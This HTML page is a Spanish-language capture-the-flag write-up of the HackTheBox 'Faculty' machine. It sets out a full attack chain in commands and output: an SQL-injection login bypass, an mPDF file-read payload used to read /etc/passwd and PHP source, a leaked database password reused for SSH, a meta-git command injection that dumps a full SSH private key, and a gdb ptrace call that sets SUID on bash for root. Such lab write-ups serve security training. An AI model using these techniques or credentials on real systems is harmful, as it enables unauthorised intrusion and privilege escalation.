@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Faculty HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/faculty.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Faculty HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Faculty de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Faculty de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Faculty HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Faculty HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Faculty de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Faculty HackTheBox</h1>
+          <p>Resolución de la máquina Faculty de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.169
+Nmap scan report for 10.10.11.169
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Con whatweb podemos ver que nos redirige a faculty.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ whatweb</span><span class="p"> 10.10.11.169
+http://10.10.11.169 [</span><span class="s2">302 Found</span><span class="p">]
+RedirectLocation[</span><span class="kd">http://faculty.htb</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Después de agregar el domino probamos aplicar descubrimiento de directorios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u faculty.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://faculty.htb
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/admin</span><span class="p">                (Status: 301) [Size: 178] [--> </span><span class="kd">http://faculty.htb/admin/</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Encontramos un login, el cual podemos burlar con una inyección simple: ' or 1=1#</p></div>
+<div><p><img src="./1.png"><p></div>
+<div><p>Con esta simple inyeccion bypasseamos el login y somos Administrator</p></div>
+<div><p><img src="./2.png"><p></div>
+<div><p>En varios campos podemos encontrar un botón de descarga de pdf</p></div>
+<div><p><img src="./3.png"><p></div>
+<div><p>Si interceptamos la petición al darle al botón, vemos lo siguiente</p></div>
+<div><p><img src="./4.png"><p></div>
+<div><p>Al urldecodearlo 2 veces y decodearlo en base64 una vez obtenemos mejor formato</p></div>
+<div><p><img src="./5.png"><p></div>
+<div><p>Al darle a forward nos crea un pdf temporal con "mpdf"</p></div>
+<div><p><img src="./6.png"><p></div>
+<div><p>Encontramos un <a href="https://github.com/mpdf/mpdf/issues/356">poc</a> para mpdf, podemos conseguir archivos de la máquina</p></div>
+
+<div><p>La idea es cambiar la petición en burpsuite para eso creamos un <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6IC9ldGMvcGFzc3dkIiBwb3MteD0iMTk1IiAvPg">payload</a> en CyberChef para encodearlo como se tramita la petición original</p></div>
+<div><p><img src="./7.png"><p></div>
+<div><p>Damos a forward y mirando los Attachments del pdf encontramos el passwd que indicamos</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Damos clic para descargar el archivo, y al leerlo podemos encontrar un par de usuarios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> passwd | </span><span class="s2">grep </span><span class="p">sh$
+</span><span class="kd">root</span><span class="p">:x:0:0:root:/root:/bin/bash
+</span><span class="kd">gbyolo</span><span class="p">:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+</span><span class="kd">developer</span><span class="p">:x:1001:1002:,,,:/home/developer:/bin/bash</span>
+</code></pre></div></div>
+
+<div><p>Probando el resto de cosas en la web encontramos algo que nos lekea información</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://faculty.htb/admin/ajax.php?action=get_schecdule"</span><span class="p">
+Fatal error: Uncaught Error: in </span><span class="kd">/var/www/scheduling/admin/admin_class.php</span><span class="p"> 370</span>
+</code></pre></div></div>
+
+<div><p>Nos da una ruta del php, asi que con un nuevo <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iIC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwIiBjb250ZW50PSIgL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAiIGljb249IkdyYXBoIiB0aXRsZT0iQXR0YWNoZWQgRmlsZTogIC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwIiBwb3MteD0iMTk1IiAvPg">payload</a> haremos lo mismo de antes</p></div>
+<div><p>Despues de abrir el pdf y descargar el php, encontramos que hace un include a "db_connect.php"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> admin_class.php
+</span><span class="na">&lt?php</span><span class="p">
+</span><span class="k">session_start</span><span class="p">();
+</span><span class="k">ini_set</span><span class="p">(</span><span class="s2">'display_errors'</span><span class="p">, </span><span class="na">1</span><span class="p">);
+Class </span><span class="k">Action</span><span class="p"> {
+        </span><span class="kd">private </span><span class="na">$db</span><span class="p">;
+
+        </span><span class="kd">public function</span><span class="k"> __construct</span><span class="p">() {
+                </span><span class="k">ob_start</span><span class="p">();
+        </span><span class="kd">include '</span><span class="s2">db_connect.php'</span><span class="p">;
+&lt.......................................></span>
+</code></pre></div></div>
+
+<div><p>Tambien daremos un vistazo ese "db_connect.php" con otro <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iIC92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vZGJfY29ubmVjdC5waHAiIGNvbnRlbnQ9IiAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwIiBpY29uPSJHcmFwaCIgdGl0bGU9IkF0dGFjaGVkIEZpbGU6ICAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2RiX2Nvbm5lY3QucGhwIiBwb3MteD0iMTk1IiAvPg">payload</a> para ver su contenido</p></div>
+<div><p>Después de descargar el php encontramos lo que parece ser una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> db_connect.php
+</span><span class="na">&lt?php
+</span><span class="k">$conn</span><span class="p">= </span><span class="k">new</span><span class="p"> mysqli(</span><span class="s2">'localhost'</span><span class="p">,</span><span class="s2">'sched'</span><span class="p">,</span><span class="kd">'Co.met06aci.dly53ro.per'</span><span class="p">,</span><span class="s2">'scheduling_db'</span><span class="p">)</span><span class="k">or</span><span class="p"> die(</span><span class="s2">"Could not connect to mysql"</span><span class="p">.mysqli_error(</span><span class="k">$con</span><span class="p">));</span>
+</code></pre></div></div>
+
+<div><p>Probamos a conectarnos por ssh, y obtenemos una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> gbyolo@10.10.11.169
+gbyolo@10.10.11.169's password: </span><span class="kd">Co.met06aci.dly53ro.per</span><span class="s2">
+gbyolo@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si miramos privilegios de sudoers podemos ejecutar meta-git como el usuario developer</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">gbyolo@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for gbyolo: </span><span class="kd">Co.met06aci.dly53ro.per</span><span class="p">
+Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git
+</span><span class="s2">gbyolo@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>BUscando un poco encontramos una <a href="https://hackerone.com/reports/728040">vulnerabilidad</a> que te permite ejecutar comandos, podemos probarla pero solo funciona en un directorio que tenga acceso asi que desde la raíz</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">gbyolo@faculty</span><span class="p">:</span><span class="na">/</span><span class="p">$ sudo -u developer meta-git clone 'poc | whoami'
+meta git cloning into 'poc | whoami' at poc | whoami
+poc | whoami:
+fatal: repository 'poc' does not exist
+whoami: ‘poc’: no such user
+</span><span class="kd">developer
+</span><span class="s2">poc | whoami ✓</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos leer la id_rsa para conectarnos por ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">gbyolo@faculty</span><span class="p">:</span><span class="na">/</span><span class="p">$ sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'
+meta git cloning into 'poc | cat ~/.ssh/id_rsa' at id_rsa
+id_rsa:
+fatal: repository 'poc' does not exist
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+
+<div><p>Nos conectamos por ssh y ahora obtenemos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> developer@10.10.11.169 -i id_rsa
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+cd1**************************f93
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando gdb podemos ver que nuestro grupo puede ejecutarlo, además tiene una capabilitie</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ groups
+developer </span><span class="kd">debug</span><span class="p"> faculty
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l $(which gdb)
+-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ getcap $(which gdb)
+/usr/bin/gdb = cap_sys_ptrace+ep
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos utilizar un proceso que este ejecutando root para con gdb asignar suid a la bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ ps faux | grep ^root | grep python3
+root   </span><span class="kd">731</span><span class="p">   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3 .....
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ gdb -p 731
+Attaching to process 731
+</span><span class="kd">(gdb)</span><span class="p"> call (void)system("chmod u+s /bin/bash")
+[Detaching after vfork from child process 44975]
+</span><span class="kd">(gdb)</span><span class="p"> quit
+A debugging session is active.
+Quit anyway? (y or n) y
+[Inferior 1 (process 731) detached]
+</span><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora que modificamos los permisos, nos podemos convertir en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">developer@faculty</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt 
+2a9*************************d03
+bash-5.0#</span>           
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
